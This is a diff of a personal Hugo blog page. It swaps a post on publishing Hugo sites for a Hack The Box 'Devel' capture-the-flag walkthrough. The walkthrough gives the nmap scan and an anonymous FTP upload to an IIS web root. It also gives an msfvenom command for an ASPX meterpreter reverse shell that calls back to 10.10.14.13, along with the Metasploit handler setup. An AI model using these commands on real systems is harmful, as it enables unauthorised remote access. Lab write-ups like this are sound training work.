@@ -21,7 +21,7 @@
     
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>New hugo post &middot; Joshua Krizek</title>
+    <title>Devel_HTB_PT1 &middot; Joshua Krizek</title>
     <meta name="description" content="" />
 
     
@@ -213,10 +213,10 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
             <div class="post">
   <div class="info">
     <h1 class="post-title">
-        <a href="https://joshuakrizek.com/posts/new_hugo_post/">New hugo post</a>
+        <a href="https://joshuakrizek.com/posts/devel_htb_pt1/">Devel_HTB_PT1</a>
     </h1>
-    <time datetime="2023-03-08T17:27:45-0800" class="post-date">
-        March 8, 2023
+    <time datetime="2023-05-21T19:20:33-0400" class="post-date">
+        May 21, 2023
     </time>
     
     
@@ -226,47 +226,49 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
     
 </div>
 
-  <ol>
-<li>
-<p>Run: <code>hugo new posts/&lt;uri_of_post&gt;.md</code>
-<img src="../../20230308172905.png" alt="Img1"></p>
-</li>
-<li>
-<p>Open in markdown editor (e.g. Obsidian)</p>
-</li>
-<li>
-<p>Once you&rsquo;ve finished writing the post change <code>draft</code> from <code>true</code> to <code>false</code></p>
-</li>
-<li>
-<p>Navigate in your terminal to the main blog directory and run <code>hugo</code></p>
-</li>
-<li>
-<p>Navigate to the public directory</p>
-</li>
-<li>
-<p>Run <code>git add .</code></p>
-</li>
-<li>
-<p>Run <code>Git commit -m &quot;&lt;name of blog post&gt;&quot;</code></p>
-</li>
-<li>
-<p>Run <code>git push origin master</code></p>
-</li>
-</ol>
+  <p><a href="https://app.hackthebox.com/machines/Devel">https://app.hackthebox.com/machines/Devel</a></p>
+<p>Step one: ping host to make sure it&rsquo;s active:
+<code>ping 10.10.10.5</code></p>
+<p>Step two: run nmap against host (in this case it doesn&rsquo;t matter how noisy we are):
+<code>nmap -v -A -p- 10.10.10.5</code>
+![[Pasted image 20230516175101.png]]
+![[Pasted image 20230516175119.png]]</p>
+<p>So we know there are two services we can start with, anonymous ftp and a windows server on port 80 with option TRACE. It looks like the ftp share is actually in the root of the IIS web server:
+![[Pasted image 20230521185353.png]]</p>
+<p>Based on that information let&rsquo;s see if we can upload a file and access it via our browser. Let&rsquo;s try a image. I&rsquo;m going to download a random one:
+![[Pasted image 20230521185544.png]]</p>
+<p>I&rsquo;m going to upload:
+![[Pasted image 20230521185720.png]]</p>
+<p>Testing failed. Note, downloading the image from the ftp server and trying to open also fails.
+![[Pasted image 20230521185805.png]]</p>
+<p>Let&rsquo;s try a text file:
+![[Pasted image 20230521192359.png]]
+That worked!
+![[Pasted image 20230521185947.png]]</p>
+<p>Now it&rsquo;s time to create a reverse shell. Based on what we already saw it needs to be ASPX since it&rsquo;s in an IIS site.</p>
+<p>Execute the following command to create the reverse shell:
+<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f aspx &gt; reverse.aspx </code>
+Upload it to the ftp share:
+<code>put reverse.aspx</code></p>
+<p>Start a listener to listen for the remote connection. Will be using metasploit at this point.
+<code>msfconsole</code>
+<code>use exploit/multi/handler</code>
+<code>set payload windows/meterpreter/reverse_tcp</code>
+<code>set LHOST tun0</code>
+<code>run</code></p>
+<p>Now navigate to that file in the browser and a connection should be opened.
+![[Pasted image 20230521192307.png]]</p>
+<p>Inspired from the Windows Privilege Escalation course from TCM Security</p>
 
   <hr>
 <div class="footer">
     
 	    
             
-	            <a class="previous-post" href="https://joshuakrizek.com/posts/hugoonwindows/?ref=footer">« Installing Hugo on Windows</a>
+	            <a class="previous-post" href="https://joshuakrizek.com/posts/automate-hugo-with-github-actions/?ref=footer">« Automate_Hugo_with_Github_Actions</a>
 	        
         
 	    
-            
-	            <a class="next-post" href="https://joshuakrizek.com/posts/automate-hugo-with-github-actions/?ref=footer">Automate_Hugo_with_Github_Actions »</a>
-	        
-        
     
 </div>
 
